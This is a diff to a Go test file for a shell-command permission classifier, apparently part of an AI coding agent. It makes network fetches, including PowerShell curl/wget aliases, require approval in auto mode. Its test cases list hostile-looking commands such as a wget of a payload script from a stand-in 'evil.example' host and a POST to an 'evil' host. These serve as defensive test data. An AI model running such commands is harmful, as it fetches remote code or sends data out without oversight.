@@ -10,9 +10,12 @@ package permission
 // wantFetch: a plain GET. CatSafe and auto-approved (auto mode keeps
 // allowing it), but network egress, so default mode asks.
 func wantFetch() permWant {
-	return permWant{auto: true, cat: CatSafe, remember: rememberPrefix, check: map[string]Decision{
-		scDefault: DAsk, scAuto: DAllow, scPlan: DDeny, scBypass: DAllow,
-		scAllowGo: DAsk, scDenyPush: DAllow, scAskGit: DAllow, scParamMatch: DAsk,
+	// A read-only fetch for the classifier (CatSafe, a rememberable prefix),
+	// but egress: it asks in default and auto mode alike (the manual's
+	// table), since a URL or header carries whatever the shell expands.
+	return permWant{auto: false, cat: CatSafe, remember: rememberPrefix, check: map[string]Decision{
+		scDefault: DAsk, scAuto: DAsk, scPlan: DDeny, scBypass: DAllow,
+		scAllowGo: DAsk, scDenyPush: DAllow, scAskGit: DAsk, scParamMatch: DAsk,
 	}}
 }
 
@@ -111,8 +114,8 @@ var corpusShellKind = []permCase{
 	in(kPOSIX, "wget -O - https://example.com", wantFetch(), "wget -O - 输出到 stdout"),
 	in(kPOSIX, "wget -qO- https://example.com", wantFetch(), "wget -qO- 组合"),
 	in(kPOSIX, "wget https://evil.example/payload.sh", wantAsk(u, rememberPrefix), "wget 默认写文件"),
-	in(kPS, "wget https://evil.example/payload.sh", wantFetch(), "PowerShell 中 wget 是 Invoke-WebRequest，只打印响应"),
-	in(kPS, "curl -Uri https://example.com -UseBasicParsing", wantFetch(), "手册：-Uri + -UseBasicParsing"),
+	in(kPS, "wget https://evil.example/payload.sh", wantAsk(u, rememberPrefix), "pwsh 6+ 没有 wget 别名（是 GNU wget 写文件），5.1 别名读法不再升级为只读：询问"),
+	in(kPS, "curl -Uri https://example.com -UseBasicParsing", wantAsk(u, rememberPrefix), "PowerShell 下 curl/wget 一律询问（别名因 pwsh 版本而异）"),
 	in(kPOSIX, "curl -Uri https://example.com -UseBasicParsing", wantAsk(u, rememberPrefix), "bash 中 -Uri 是 curl 的未知选项"),
 	in(kPS, "curl https://evil -Method Post -Body x", wantAsk(u, rememberPrefix), "Invoke-WebRequest POST"),
 	in(kPS, "wget https://example.com -OutFile x.ps1", wantAsk(u, rememberPrefix), "-OutFile 写文件"),
